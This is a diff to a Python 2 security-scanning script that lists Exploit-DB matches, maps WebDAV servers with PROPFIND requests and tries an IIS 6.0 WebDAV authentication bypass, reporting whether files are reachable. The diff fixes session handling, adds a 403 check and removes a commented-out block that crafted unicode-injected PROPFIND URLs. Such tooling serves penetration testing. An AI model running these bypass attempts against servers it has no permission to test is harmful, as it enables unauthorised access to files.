@@ -149,19 +149,23 @@ def main():
 		i.write(bcolors.HEADER + "[*] WebDAV Auth Bypass: " + str(dabp) + "\n" + bcolors.ENDC)
 		i.write(bcolors.HEADER + "[*]==================={Exploit-DB Exploits}==================[*] \n" + bcolors.ENDC)
 		for k,v in f.iteritems():
-			i.write(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " %s ==> %s \n" % (k, v)  )
+                        if k == "Server" or k == "WebDAV":
+                            next
+                        else:
+			    i.write(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " %s ==> %s \n" % (k, v)  )
 		i.write(bcolors.HEADER + "[*]===================={~Server Mapping~}====================[*] \n" + bcolors.ENDC)
 		if davEnabled == "Enabled":
-			sess.headers.update = {'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'}
-                        client = dav.Client(sess)
-			r = client.propfind(url)
-			for file in r:
-				if file[1] == 0 and file[2].split(' ')[2] == "OK":
-					fname = file[0].split('/')[-2]
-					directory = directory + "/" + fname
-					fname = directory
+			sess.headers.update({'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'})
+                        client = dav.Client()
+                        r = client.propfind(sess,url)
+                        if r != 403:
+			    for file in r:
+			    	if file[1] == 0 and file[2].split(' ')[2] == "OK":
+				    fname = file[0].split('/')[-2]
+				    directory = directory + "/" + fname
+				    fname = directory
 				else:
-					fname = file[0].split('/')[-1]
+				    fname = file[0].split('/')[-1]
 				status = file[2].split(' ')[2]
 				size = str(file[1])
 				if status == "OK":
@@ -180,27 +184,16 @@ def main():
 							    n = n + 1
 						    url = url + "/" + fname
 					    print("[!!] " + url)
-					    response = client.get(url)
+					    response = client.get(sess,url)
 					    if response.status_code == 200:
 					        i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked!! \n" + bcolors.ENDC)
 					    else:
 					        i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
                                         else:
                                             i.write(bcolors.WARNING + "[-] Webserver doesn't appear to be IIS 6.0. Skipping auth bypass attempt. \n" + bcolors.ENDC)
+                        else:
+                            i.write(bcolors.FAIL + "[!] Unable to access WebDAV, server is restricting access\n" + bcolors.ENDC)
 					
-					#	headers = {'Host': host, 'TE': 'trailers', 'Depth': '1', 'Content-Type': 'application/xml', 'User-Agent': 'ZOMG!!!!!!!!!!@#2!@#!@#!!'}
-					#	url = directory
-					#	pre = url[0:]
-					#	post = url[2:]
-					#	url = pre + unichar + post
-					#	s = requests.session()
-					#	response = s.request('PROPFIND', url, headers=headers)
-					#	if response.status_code == 200:
-					#		response = client.propfind(url,headers)
-					#		r.update(response)
-					#		i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked! \n" + bcolors.ENDC)
-					#	else:
-					#		i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
 						
 		else:
 			i.write(bcolors.FAIL +  "[-] WebDAV is not enabled.  Unable to map server. \n" + bcolors.ENDC)
